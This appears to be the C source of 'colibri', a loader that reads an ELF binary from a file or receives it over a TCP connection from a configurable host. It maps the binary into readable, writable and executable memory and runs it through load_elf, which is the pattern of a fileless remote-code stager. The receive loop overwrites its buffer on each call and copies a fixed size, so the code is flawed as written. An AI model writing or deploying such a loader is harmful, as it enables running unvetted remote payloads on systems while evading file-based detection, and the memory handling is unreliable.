#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "colibri.h"
#include "utils.h"
#include "errno.h"


colibri_t *colibri_init(char **argv) {
    colibri_t *colibri = calloc(1, sizeof(colibri_t));
    colibri->argv = argv;
    return colibri;
}

int colibri_execute(colibri_t *colibri) {

    char *src;
    char buffer[SIZE_OF_ELF];

    if (colibri->input == INPUT_FILE) {

        struct stat file_information;

        int fd = open(colibri->file, O_RDONLY);
        if (fd == -1) {
            printf("can't open a selected file '%s'\n", colibri->file);
            return 1;
        }

        if (stat(colibri->file, &file_information) == -1) {
            printf("can't stat a selected file '%s'\n", colibri->file);
            return 1;
        }


        src = mmap(NULL, file_information.st_size, PROT_WRITE | PROT_EXEC | PROT_READ, MAP_PRIVATE, fd, 0);
        if(src == MAP_FAILED) {
            printf("Unable to read ELF file in: %s\n", strerror(errno));
            exit(EXIT_FAILURE);
        }
        close(fd);
    } else if (colibri->input == INPUT_SOCKET) {
        int sfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sfd == -1) {
            printf("error on oppening a socket.\n");
            return 1;
        }

        struct sockaddr_in sa;
        sa.sin_port = htons(colibri->port);
        sa.sin_addr.s_addr = inet_addr(colibri->host);
        sa.sin_family = AF_INET;

        printf("[+] starting connection at %s:%d\n", colibri->host, colibri->port);
        int c = connect(sfd, (struct sockaddr *) &sa, sizeof(sa));
        if (c == -1) {
            printf("error connect %s\n", strerror(errno));
            exit(1);
        }

        int read_bytes = 0;
        int rcv_bytes = 0;
        src = mmap(NULL, sizeof(buffer), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
        while ((rcv_bytes = recvfrom(sfd, buffer, sizeof(buffer), MSG_WAITALL, NULL, 0))) {
            if (rcv_bytes == -1) {
                printf("[-] error : %s !\n", strerror(errno));
                continue;
            }
        }

        memcpy(src, buffer, SIZE_OF_ELF);
    }
    load_elf(src, colibri->argv);

    return 0;
}


